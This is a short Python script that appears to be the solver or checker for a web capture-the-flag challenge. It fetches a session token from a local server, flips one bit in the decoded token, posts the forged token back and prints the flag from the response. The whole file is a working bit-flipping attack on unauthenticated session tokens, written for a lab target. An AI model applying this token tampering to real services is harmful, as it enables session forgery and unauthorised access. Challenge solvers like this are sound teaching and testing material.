#!/bin/python3

import os
from base64 import b64decode, b64encode
import requests
import logging
logging.disable()

# Per le challenge web
URL = os.environ.get("URL", "http://localhost:8000")
if URL.endswith("/"):
   URL = URL[:-1]

# Functions
def xor(key, data):
    res = bytearray()
    for i in range(len(data)):
        res.append(data[i] ^ key[i % len(key)])
    return res

# Check challenge
s = requests.Session()
s.get(URL)
token = s.get(URL + "/save_session").json()["token"]
token = bytearray(b64decode(token))
token[5] ^= 1
new_token = b64encode(token).decode()
flag = s.post(URL, data={"sessionToken": new_token}).text.split("flag:<br>\n")[1].splitlines()[0].strip()

print(flag)
